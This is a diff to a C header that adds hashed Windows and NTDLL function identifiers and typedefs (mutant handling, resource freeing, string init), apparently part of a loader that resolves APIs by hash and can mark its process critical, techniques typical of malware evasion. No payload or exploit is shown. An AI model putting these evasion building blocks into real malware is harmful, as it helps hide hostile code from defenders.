@@ -15,6 +15,9 @@
 #define LOADRESOURCE_HASH       0xffffffff92ffa82f
 #define LOCKRESOURCE_HASH       0xffffffff49b3b7c3
 #define SIZEOFRESOURCE_HASH     0xffffffffc319fa22
+#define FREERESOURCE_HASH       0xffffffff033a7dbb
+#define GETTICKCOUNT64_HASH     0xffffffff517fef08
+#define RTLSECUREZEROMEMORY_HASH    0xffffffff8d3c4b0c
 
 // Hashes of NTDLL functions
 #define NTALLOCATEVIRTUALMEMORY_HASH	0xffffffffe0762feb
@@ -23,10 +26,16 @@
 #define NTWAITFORSINGLEOBJECT_HASH  	0xffffffffdd554681
 #define RTLSETPROCESSISCRITICAL_HASH    0xffffffff26f94a0b
 #define NTDELAYEXECUTION_HASH           0xfffffffff5a86278
+#define NTCREATEMUTANT_HASH             0xffffffffce8ff6b0
+#define NTRELEASEMUTANT_HASH            0xffffffff845c7d53
+#define NTOPENMUTANT_HASH               0xffffffffb34696b2
+#define NTCLOSE_HASH                    0xffffffff0d09c750
+#define RTLINITUNICODESTRING_HASH       0xffffffff7aa7b69b
+#define RTLINITUNICODESTRINGEX_HASH     0xffffffff22be6f7e
 
+// Pseudo handles to current process & thread
 #define NtCurrentProcess() ((HANDLE)-1) // Return the pseudo handle for the current process
 #define NtCurrentThread()  ((HANDLE)-2) // Return the pseudo handle for the current thread
-
 
 // Hashes of WinAPI Function
 typedef HANDLE(WINAPI* t_CreateMutexW)(
@@ -72,6 +81,12 @@ typedef BOOL(WINAPI* t_FreeResource)(
     _In_ HGLOBAL hResData
     );
 
+typedef ULONGLONG (WINAPI* t_GetTickCount64)();
+
+typedef PVOID (WINAPI* t_RtlSecureZeroMemory)(
+    _Out_ PVOID  ptr,
+    _In_  SIZE_T cnt
+);
 
 // Typedefs of NTDLL functions
 typedef NTSTATUS (NTAPI* t_RtlSetProcessIsCritical)(
@@ -80,8 +95,24 @@ typedef NTSTATUS (NTAPI* t_RtlSetProcessIsCritical)(
     BOOLEAN bNeedScb    // need system critical breaks
     );    	
 
-typedef NTSTATUS(NTAPI* t_NtDelayExecution)(
+typedef NTSTATUS (NTAPI* t_NtDelayExecution)(
     BOOLEAN              Alertable,
     PLARGE_INTEGER       DelayInterval
     );
 
+typedef void (NTAPI* t_RtlInitUnicodeString)(
+    _Out_           PUNICODE_STRING DestinationString,
+    _In_opt_        PCWSTR          SourceString
+);
+
+typedef NTSTATUS (NTAPI* t_RtlInitUnicodeStringEx)(
+    _Out_           PUNICODE_STRING DestinationString,
+    _In_opt_        PCWSTR          SourceString
+);
+
+typedef NTSTATUS(NTAPI* t_NtCreateMutant)(
+    OUT PHANDLE MutantHandle,
+    IN ACCESS_MASK DesiredAccess,
+    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
+    IN BOOLEAN InitialOwner
+    );
